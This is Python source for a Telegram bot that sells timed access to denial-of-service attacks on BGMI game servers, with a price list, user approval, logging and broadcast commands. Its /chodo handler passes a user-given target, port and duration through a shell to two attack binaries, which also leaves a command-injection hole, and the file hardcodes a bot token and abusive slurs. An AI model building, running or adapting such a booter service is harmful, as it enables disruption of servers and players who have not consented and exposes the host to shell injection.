import telebot
import subprocess
import datetime
import os
from keep_alive import keep_alive
keep_alive()

# Insert your Telegram bot token here
bot = telebot.TeleBot('7846072513:AAEnen_EhJwApi86j3t2Cw9E9cMXSfgjWGw-0rkeDPZfY')

# Admin user IDs
admin_id = {"7083378335"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Global variable to track if an attack is running
attack_running = False

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Thik se daal bsdk. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} ."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists ."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add ."
    else:
        response = "Mood ni hai abhi pelhe purchase kar isse:- @GTX_GHOST."

    bot.reply_to(message , response)

# Handler for /attack command
@bot.message_handler(commands=['chodo'])
def handle_attack(message):
    global attack_running

    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if attack_running:
            response = "Abhi Chudai Chalu hai. Thoda sabar kar pehle jab wo khatam hoga tbb tu Chodna."
            bot.reply_to(message, response)
            return

        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer

            if time > 300:
                response = "Error: Time interval must be less than 300"
            else:
                attack_running = True  # Set the attack state to running
                try:
                    log_command(user_id, target, port, time)

                    # Run both commands side by side
                    ranbal_command = f"./ranbal {target} {port} {time} 800"
                    second_command = f"./2111 {target} {port} {time} 800"

                    # Start both processes
                    process1 = subprocess.Popen(ranbal_command, shell=True)
                    process2 = subprocess.Popen(second_command, shell=True)

                    # Wait for both to complete
                    process1.wait()
                    process2.wait()

                    response = "Chudai completed successfully."
                except Exception as e:
                    response = f"Error during attack: {str(e)}"
                finally:
                    attack_running = False  # Reset the attack state
        else:
            response = "Usage: /chodo <target> <port> <time>"
    else:
        response = "Nhi milega GROUP per Free hai Wha use krle."

    bot.reply_to(message, response)




        
# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "Pehle Buy krke Aao Bhenkelode ❌ ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''
💥 /chodo : 😫BGMI WALO KI MAA KO CHODO🥵. 
💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
💥 /plan : 💵SABKE BSS KA BAT HAI💵.
💥 /myinfo : 📃APNE PLAN KI VEDHTA DEKHLE LODE📃.

👀 To See Admin Commands:
🤖 /admincmd : Shows All Admin Commands.

Buy From :- @TREXVIVEK
Official Channel :- https://t.me/+HEyXXgA_1hU4NmZl
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🔥VIVEK ke LODE pe aapka swagat hai, {user_name}! Sabse acche se bgmi ki maa behen yahi hack karta hai. Kharidne ke liye Kira se sampark karein.
🤗Try To Run This Command : /help 
💵BUY :-@TREXVIVEK'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules :

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/+HEyXXgA_1hU4NmZl OTHERWISE NOT WORK
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Ye plan hi kafi hai bgmi ki ma chodne ke liye!!:

Vip  :
-> Attack Time :  (S)
> After Attack Limit :10 sec
-> Concurrents Attack : 5

Pr-ice List :
Day-->150 Rs
3Day-->300 Rs
Week-->600 Rs
Month-->1500 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

➕ /add <userId> : Add a User.
🖕 /remove <userid> Remove a User.
📒 /allusers : Authorised Users Lists.
📃 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "BhenChod Owner na HAI TU LODE."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        
